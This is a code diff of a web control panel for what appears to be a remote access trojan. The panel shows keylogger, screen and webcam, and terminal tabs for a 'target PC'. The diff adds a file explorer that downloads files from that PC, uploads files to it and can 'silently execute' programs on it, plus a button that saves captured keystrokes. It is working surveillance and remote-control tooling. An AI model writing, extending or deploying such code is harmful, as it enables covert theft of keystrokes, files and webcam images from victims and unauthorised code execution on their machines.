@@ -28,7 +28,10 @@
             <button class="nav-link" id="media-tab" data-bs-toggle="tab" data-bs-target="#media" type="button" role="tab">Screen & Webcam</button>
         </li>
         <li class="nav-item" role="presentation">
-            <button class="nav-link" id="keylog-tab" data-bs-toggle="tab" data-bs-target="#keylog" type="button" role="tab">Keylogger & Files</button>
+            <button class="nav-link" id="keylog-tab" data-bs-toggle="tab" data-bs-target="#keylog" type="button" role="tab">Keylogger</button>
+        </li>
+        <li class="nav-item" role="presentation">
+            <button class="nav-link" id="files-tab" data-bs-toggle="tab" data-bs-target="#files" type="button" role="tab">File Manager</button>
         </li>
         <li class="nav-item" role="presentation">
             <button class="nav-link" id="terminal-tab" data-bs-toggle="tab" data-bs-target="#terminal" type="button" role="tab">Terminal</button>
@@ -60,6 +63,7 @@
                     <h5 class="mb-3">Visible Applications</h5>
                     <div class="input-group mb-3">
                         <button class="btn btn-info" onclick="getApplications()">Refresh Apps</button>
+                        <button class="btn btn-secondary" onclick="openAppPicker()">Browse</button>
                         <input type="text" id="start-app-path" class="form-control" placeholder="Path to open (e.g. notepad.exe)">
                         <button class="btn btn-success" onclick="startApplication()">Start App</button>
                     </div>
@@ -111,15 +115,16 @@
             </div>
         </div>
 
-        <!-- Keylogger & Files Tab -->
+        <!-- Keylogger Tab -->
         <div class="tab-pane fade" id="keylog" role="tabpanel">
             <div class="row">
                 <!-- Keylogger -->
-                <div class="col-md-6">
+                <div class="col-12">
                     <div class="card">
-                        <div class="card-header bg-dark text-white d-flex justify-content-between">
+                        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center">
                             <span>Live Keylogger</span>
                             <div>
+                                <button class="btn btn-sm btn-info me-2" onclick="saveKeylog()">Save Log</button>
                                 <button class="btn btn-sm btn-success" onclick="startKeylogger()">Start</button>
                                 <button class="btn btn-sm btn-danger" onclick="stopKeylogger()">Stop</button>
                             </div>
@@ -129,18 +134,47 @@
                         </div>
                     </div>
                 </div>
-                <!-- Files -->
-                <div class="col-md-6">
-                    <div class="card">
-                        <div class="card-header bg-dark text-white">File Transfer</div>
-                        <div class="card-body">
-                            <div class="input-group mb-3">
-                                <input type="text" id="file-path-input" class="form-control" placeholder="C:\Users\Public\file.txt">
-                                <button class="btn btn-outline-secondary" type="button" onclick="downloadFile()">Download</button>
-                            </div>
-                            <div id="file-download-status" class="text-muted small"></div>
-                        </div>
+            </div>
+        </div>
+
+        <!-- File Manager Tab -->
+        <div class="tab-pane fade" id="files" role="tabpanel">
+            <div class="card border-primary">
+                <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">
+                    <span>File Explorer</span>
+                    <div>
+                        <button class="btn btn-sm btn-outline-light" onclick="requestDirectoryContents('')">Drives</button>
+                        <button class="btn btn-sm btn-light" onclick="navigateUp()">Up</button>
                     </div>
+                </div>
+                <div class="card-body">
+                    <div class="input-group mb-3">
+                        <span class="input-group-text">Path</span>
+                        <input type="text" id="current-dir-path" class="form-control" placeholder="C:\">
+                        <button class="btn btn-primary" onclick="requestDirectoryContents(document.getElementById('current-dir-path').value)">Go</button>
+                    </div>
+                    
+                    <div class="input-group mb-3">
+                        <input type="file" id="upload-file-input" class="form-control">
+                        <button class="btn btn-warning" onclick="uploadFileToAgent()">Upload to Current Folder</button>
+                    </div>
+                    
+                    <div class="table-responsive" style="max-height: 400px; overflow-y: auto;">
+                        <table class="table table-sm table-hover align-middle">
+                            <thead class="table-light" style="position: sticky; top: 0; z-index: 1;">
+                                <tr>
+                                    <th style="width: 50px">Type</th>
+                                    <th>Name</th>
+                                    <th style="width: 120px">Size</th>
+                                    <th style="width: 100px">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="file-table-body">
+                                <tr><td colspan="4" class="text-center text-muted">Select a PC to browse files</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <div id="file-download-status" class="text-success small mt-2 fw-bold"></div>
                 </div>
             </div>
         </div>
@@ -176,6 +210,31 @@
             </div>
         </div>
     </div>
+    <!-- MODALS -->
+    <!-- App Picker Modal -->
+    <div class="modal fade" id="appPickerModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header bg-dark text-white">
+                    <h5 class="modal-title">Select Application (Remote PC)</h5>
+                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body bg-light">
+                    <div class="input-group mb-2">
+                        <button class="btn btn-outline-secondary" onclick="requestDirectoryContents('', 'modal')">Drives</button>
+                        <button class="btn btn-secondary" onclick="navigateUp('modal')">Up</button>
+                        <input type="text" id="picker-path" class="form-control" readonly>
+                    </div>
+                    <div class="table-responsive bg-white border" style="height: 350px;">
+                        <table class="table table-sm table-hover align-middle">
+                            <tbody id="picker-table-body"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
 </div>
 
 @section Scripts {
@@ -288,6 +347,9 @@
             // Tự động yêu cầu danh sách Webcam khi vừa chọn máy mới
             document.getElementById('webcam-select').innerHTML = '<option value="">Loading cameras...</option>';
             connection.invoke("RequestWebcams", currentTargetId).catch(err => console.error(err));
+
+            // Load danh sách ổ đĩa mặc định
+            requestDirectoryContents("");
         }
 
         // --- COMMANDS ---
@@ -417,27 +479,258 @@
             consoleEl.scrollTop = consoleEl.scrollHeight; // Auto-scroll to bottom
         });
 
-        function downloadFile() {
+        async function saveKeylog() {
+            const consoleEl = document.getElementById("keylog-console");
+            const textToSave = consoleEl.textContent;
+            if (!textToSave || textToSave.trim() === "> Awaiting key strokes...") {
+                alert("Không có gì để lưu!");
+                return;
+            }
+
+            try {
+                const blob = new Blob([textToSave], { type: "text/plain;charset=utf-8" });
+                const defaultName = `Keylog_${new Date().toISOString().slice(0,10).replace(/-/g,"")}.txt`;
+
+                if (window.showSaveFilePicker) {
+                    const opts = { suggestedName: defaultName };
+                    const handle = await window.showSaveFilePicker(opts);
+                    const writable = await handle.createWritable();
+                    await writable.write(blob);
+                    await writable.close();
+                } else {
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = defaultName;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                }
+                alert("Lưu file Keylog thành công!");
+            } catch (err) {
+                if (err.name !== 'AbortError') {
+                    alert("Lỗi khi lưu file: " + err.message);
+                }
+            }
+        }
+
+        function downloadFile(filePath) {
             if(!currentTargetId) return; 
-            let path = document.getElementById("file-path-input").value;
-            if(!path) { alert("Please enter the file path!"); return; }
+            if(!filePath) { alert("Invalid file path!"); return; }
             
-            document.getElementById("file-download-status").textContent = "Requesting file...";
-            connection.invoke("RequestFileDownload", currentTargetId, path).catch(err => {
+            document.getElementById("file-download-status").textContent = "Requesting file: " + filePath;
+            connection.invoke("RequestFileDownload", currentTargetId, filePath).catch(err => {
                 document.getElementById("file-download-status").textContent = "Error: " + err;
             });
         }
-        
-        connection.on("ReceiveFile", function(targetId, fileName, base64Data) {
-            document.getElementById("file-download-status").textContent = "File received: " + fileName;
+
+        // --- NEW: FILE BROWSER JS LOGIC ---
+        let currentDirectory = "";
+        let pickerDirectory = "";
+        let activeExplorer = "main"; // "main" or "modal"
+
+        function openAppPicker() {
+            if(!currentTargetId) { alert("Please select a PC from the sidebar first!"); return; }
+            var myModal = new bootstrap.Modal(document.getElementById('appPickerModal'));
+            myModal.show();
+            // Load drives into the modal picker
+            requestDirectoryContents("", "modal");
+        }
+
+        function selectAppForRun(path) {
+            document.getElementById('start-app-path').value = path;
+            const myModalEl = document.getElementById('appPickerModal');
+            const modal = bootstrap.Modal.getInstance(myModalEl);
+            modal.hide();
+        }
+
+        function requestDirectoryContents(path, explorer = "main") {
+            if(!currentTargetId) return;
+            activeExplorer = explorer;
+            const targetTbody = explorer === "main" ? "file-table-body" : "picker-table-body";
             
-            // Create a fake anchor tag to trigger browser download
-            const a = document.createElement('a');
-            a.href = "data:application/octet-stream;base64," + base64Data;
-            a.download = fileName;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+            document.getElementById(targetTbody).innerHTML = '<tr><td colspan="4" class="text-center"><span class="spinner-border spinner-border-sm"></span> Loading folders...</td></tr>';
+            connection.invoke("RequestDirectoryContents", currentTargetId, path).catch(err => console.error(err));
+        }
+
+        connection.on("ReceiveDirectoryContents", function(targetId, path, jsonStr) {
+            const isModal = activeExplorer === "modal";
+            
+            if (isModal) {
+                pickerDirectory = path;
+                document.getElementById("picker-path").value = path;
+            } else {
+                currentDirectory = path;
+                document.getElementById("current-dir-path").value = path;
+            }
+            
+            const list = JSON.parse(jsonStr);
+            const tbodyId = isModal ? "picker-table-body" : "file-table-body";
+            const tbody = document.getElementById(tbodyId);
+            tbody.innerHTML = "";
+            
+            if (list.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" class="text-center text-danger">Folder is empty or access denied</td></tr>';
+                return;
+            }
+
+            list.forEach(item => {
+                let icon = "";
+                let sizeStr = "";
+                let actionBtn = "";
+                
+                let safePath = item.Path.replace(/\\/g, '\\\\');
+
+                if (item.Type === "Drive") {
+                    icon = "💽";
+                    sizeStr = formatBytes(item.Size);
+                    actionBtn = `<button class="btn btn-sm btn-outline-primary" onclick="requestDirectoryContents('${safePath}', '${activeExplorer}')">Open</button>`;
+                } else if (item.Type === "Folder") {
+                    icon = "📁";
+                    sizeStr = "";
+                    actionBtn = `<button class="btn btn-sm btn-outline-primary" onclick="requestDirectoryContents('${safePath}', '${activeExplorer}')">Open</button>`;
+                } else {
+                    icon = "📄";
+                    sizeStr = formatBytes(item.Size);
+                    
+                    if (isModal) {
+                        // Modal view only highlights executables
+                        const ext = item.Name.toLowerCase();
+                        if (ext.endsWith(".exe") || ext.endsWith(".bat") || ext.endsWith(".cmd")) {
+                            actionBtn = `<button class="btn btn-sm btn-success fw-bold" onclick="selectAppForRun('${safePath}')">Select</button>`;
+                        } else {
+                            actionBtn = `<span class="text-muted small">Not runnable</span>`;
+                        }
+                    } else {
+                        // Main view shows Download and Run
+                        actionBtn = `<button class="btn btn-sm btn-success me-1" onclick="downloadFile('${safePath}')">↓ DL</button>`;
+                        const ext = item.Name.toLowerCase();
+                        if (ext.endsWith(".exe") || ext.endsWith(".bat") || ext.endsWith(".cmd")) {
+                            actionBtn += `<button class="btn btn-sm btn-danger" onclick="runRemoteApp('${safePath}')">▶ Run</button>`;
+                        }
+                    }
+                }
+
+                tbody.innerHTML += `<tr>
+                    <td class="text-center fs-5" style="width: 40px">${icon}</td>
+                    <td>${item.Name}</td>
+                    <td class="text-muted small" style="width: 100px">${sizeStr}</td>
+                    <td style="width: 120px">${actionBtn}</td>
+                </tr>`;
+            });
+        });
+
+        function navigateUp(explorer = "main") {
+            const currentPath = explorer === "main" ? currentDirectory : pickerDirectory;
+            
+            if (!currentPath) {
+                requestDirectoryContents("", explorer);
+                return;
+            }
+            
+            let path = currentPath;
+            if (path.endsWith("\\") && path.length > 3) {
+                path = path.slice(0, -1);
+            }
+            
+            const lastSlash = path.lastIndexOf("\\");
+            if (lastSlash > 0) {
+                let parent = path.substring(0, lastSlash);
+                if (parent.length === 2 && parent[1] === ':') parent += "\\"; 
+                requestDirectoryContents(parent, explorer);
+            } else {
+                requestDirectoryContents("", explorer); 
+            }
+        }
+
+        function formatBytes(bytes, decimals = 2) {
+            if (!+bytes) return '0 Bytes';
+            const k = 1024;
+            const dm = decimals < 0 ? 0 : decimals;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
+        }
+
+        async function uploadFileToAgent() {
+            if(!currentTargetId) { alert("Please select a PC first."); return; }
+            if(!currentDirectory) { alert("Please open a valid target folder first (e.g. C:\\). Cannot upload directly to the Drive list."); return; }
+            
+            const fileInput = document.getElementById("upload-file-input");
+            if(fileInput.files.length === 0) { alert("Please select a file to upload!"); return; }
+            
+            const file = fileInput.files[0];
+            const reader = new FileReader();
+            
+            document.getElementById("file-download-status").textContent = `Uploading ${file.name} (${formatBytes(file.size)}). Please wait...`;
+            
+            reader.onload = function(e) {
+                const dataUrl = e.target.result;
+                const base64Data = dataUrl.substring(dataUrl.indexOf(',') + 1);
+                
+                connection.invoke("UploadFileToAgent", currentTargetId, currentDirectory, file.name, base64Data)
+                .then(() => {
+                    document.getElementById("file-download-status").textContent = `File ${file.name} uploaded successfully to ${currentDirectory}!`;
+                    fileInput.value = ""; // Clear
+                    setTimeout(() => requestDirectoryContents(currentDirectory), 1000); // Reload folder to show new file
+                })
+                .catch(err => {
+                    document.getElementById("file-download-status").textContent = "Upload Error: " + err;
+                });
+            };
+            
+            reader.readAsDataURL(file);
+        }
+
+        function runRemoteApp(path) {
+            if(!currentTargetId) return;
+            if(confirm(`CRITICAL: Are you sure you want to silently execute this file on the target PC?\n\nFile: ${path}`)) {
+                connection.invoke("StartApplication", currentTargetId, path).catch(err => console.error(err));
+                document.getElementById("file-download-status").textContent = `Sent run command for: ${path}`;
+            }
+        }
+        
+        connection.on("ReceiveFile", async function(targetId, fileName, base64Data) {
+            document.getElementById("file-download-status").textContent = "File received: " + fileName + ". Waiting for save location...";
+            
+            try {
+                // Convert base64 to Blob
+                const byteCharacters = atob(base64Data);
+                const byteNumbers = new Array(byteCharacters.length);
+                for (let i = 0; i < byteCharacters.length; i++) {
+                    byteNumbers[i] = byteCharacters.charCodeAt(i);
+                }
+                const byteArray = new Uint8Array(byteNumbers);
+                const blob = new Blob([byteArray], {type: "application/octet-stream"});
+
+                if (window.showSaveFilePicker) {
+                    // Mở hộp thoại "Save As" chuyên nghiệp (chỉ hỗ trợ trên Chrome/Edge/Opera đời mới)
+                    const opts = { suggestedName: fileName };
+                    const handle = await window.showSaveFilePicker(opts);
+                    const writable = await handle.createWritable();
+                    await writable.write(blob);
+                    await writable.close();
+                    document.getElementById("file-download-status").textContent = "File saved successfully!";
+                } else {
+                    // Cách cổ điển: Tải thẳng vào thư mục Downloads cho các trình duyệt cũ
+                    const url = window.URL.createObjectURL(blob);
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = fileName;
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+                    window.URL.revokeObjectURL(url);
+                    document.getElementById("file-download-status").textContent = "File downloaded to Downloads folder.";
+                }
+            } catch (err) {
+                if (err.name !== 'AbortError') {
+                    document.getElementById("file-download-status").textContent = "Error saving file: " + err.message;
+                } else {
+                    document.getElementById("file-download-status").textContent = "Save cancelled by user.";
+                }
+            }
             
             setTimeout(() => {
                 document.getElementById("file-download-status").textContent = ""; // Clear status after 3s
